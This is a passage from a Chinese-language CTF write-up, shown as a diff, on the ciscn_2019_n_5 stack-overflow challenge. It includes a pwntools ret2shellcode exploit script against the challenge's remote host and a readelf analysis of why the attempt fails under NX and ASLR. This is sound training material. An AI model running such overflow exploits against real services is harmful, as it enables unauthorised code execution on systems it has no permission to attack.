@@ -769,3 +769,62 @@ if __name__ == "__main__":
     main()
 ```
 
+#### 例题 2：ciscn_2019_n_5
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_n_5)
+
+这道题虽然网络上很多题解都是 ret2shellcode 做的，但是至少在 BUUOJ 上，我试了三个 ret2shellcode 的题解都死了。
+
+正解是 ret2libc，但是在这里只说 ret2shellcode 的错解（误）
+
+安全检查：
+
+<img width="445" height="197" alt="image" src="https://github.com/user-attachments/assets/7c5749e3-9391-41ec-8225-50772ca0ddd7" />
+
+这道题反编译如下：
+
+<img width="1018" height="338" alt="image" src="https://github.com/user-attachments/assets/ef3e1051-a2e1-4453-9fa7-8d5c037b9467" />
+
+很容易想到 ret2shellcode，先把 shellcode 填入 name，然后利用 gets 栈溢出，使 name 的地址覆盖 ret。
+
+（当然也可以让 shellcode 填入 text，但是 text 在栈上，地址会因为 ASLR 随机化）
+
+<img width="1014" height="317" alt="image" src="https://github.com/user-attachments/assets/f5315268-2fc2-4269-9d2b-37e4a16cbf53" />
+
+```
+# written by Sonnety
+from pwn import *
+
+context.arch="amd64"
+host = "node5.buuoj.cn"
+port = 25334
+name_addr=0x601080
+shellcode=asm(shellcraft.sh())
+offset = 0x20+8
+
+def main():
+    io=remote(host,port)
+    io.recvline()
+    io.sendline(shellcode)
+    io.recvline()
+    io.recvline()
+    payload=b"A"*offset+p64(name_addr)
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+但是上面的代码会炸，为什么不能 ret2shellcode 呢？
+
+<img width="1208" height="497" alt="image" src="https://github.com/user-attachments/assets/71c291c8-56d8-46ae-b008-bcdd33f67a4a" />
+
+执行 `readelf -W -l ciscn_2019_n_5`，发现 name 的地址 `0x601080` 落在 `0x0000000000600e28` 和 `0x0000000000600e28+0x0001d0` 之间，其权限是 RW ，没有 E，指该段不能执行。
+
+同理，`GNU_STACK` 的权限是 RWE，代表从栈上 ret2shellcode 从权限意义上是可行的。
+
+但是栈的地址是 ASLR 随机化的，所以找栈的位置为什么不直接 ret2libc 呢。
+
+不过大概可以在本地关掉 ASLR 实验一下。
+
